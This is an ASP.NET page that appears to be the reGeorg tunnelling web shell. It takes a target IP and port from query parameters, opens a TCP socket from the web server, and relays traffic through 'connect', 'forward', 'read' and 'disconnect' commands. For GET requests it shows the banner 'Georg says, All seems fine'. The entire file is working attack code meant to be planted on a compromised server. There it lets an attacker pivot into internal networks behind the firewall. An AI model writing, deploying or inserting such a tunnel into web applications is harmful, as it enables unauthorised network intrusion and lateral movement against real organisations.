<%@ Page Language="C#" EnableSessionState="True"%>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%
try
{
    if (Request.HttpMethod == "POST")
    {
        string q = Request.QueryString["cmd"].ToLower();
        if (q == "connect")
        {
            try
            {
                string tgt = Request.QueryString["target"];
                int prt = int.Parse(Request.QueryString["port"]);
                IPAddress ip = IPAddress.Parse(tgt);
                IPEndPoint ep = new IPEndPoint(ip, prt);
                Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                s.Connect(ep);
                s.Blocking = false;
                Session["c"] = s;
                Response.AddHeader("X-STATUS", "OK");
            }
            catch (Exception e)
            {
                Response.AddHeader("X-ERROR", e.Message);
                Response.AddHeader("X-STATUS", "FAIL");
            }
        }
        else if (q == "disconnect")
        {
            try {
                ((Socket)Session["c"]).Close();
            } catch {}
            Session.Abandon();
            Response.AddHeader("X-STATUS", "OK");
        }
        else if (q == "forward")
        {
            Socket s = (Socket)Session["c"];
            try
            {
                int l = Request.ContentLength;
                byte[] b = new byte[l];
                int r = 0;
                while ((r = Request.InputStream.Read(b, 0, b.Length)) > 0)
                {
                    s.Send(b, r, SocketFlags.None);
                }
                Response.AddHeader("X-STATUS", "OK");
            }
            catch (Exception e)
            {
                Response.AddHeader("X-ERROR", e.Message);
                Response.AddHeader("X-STATUS", "FAIL");
            }
        }
        else if (q == "read")
        {
            Socket s = (Socket)Session["c"];
            try
            {
                byte[] buf = new byte[512];
                int r = 0;
                try
                {
                    while ((r = s.Receive(buf)) > 0)
                    {
                        byte[] outb = new byte[r];
                        Buffer.BlockCopy(buf, 0, outb, 0, r);
                        Response.BinaryWrite(outb);
                    }
                    Response.AddHeader("X-STATUS", "OK");
                }
                catch (SocketException)
                {
                    Response.AddHeader("X-STATUS", "OK");
                    return;
                }
            }
            catch (Exception e)
            {
                Response.AddHeader("X-ERROR", e.Message);
                Response.AddHeader("X-STATUS", "FAIL");
            }
        }
        else
        {
            Response.StatusCode = 404;
        }
    }
    else
    {
        Response.Write("Georg says, 'All seems fine'");
    }
}
catch (Exception e)
{
    Response.AddHeader("X-ERROR", e.Message);
    Response.AddHeader("X-STATUS", "FAIL");
}
%>
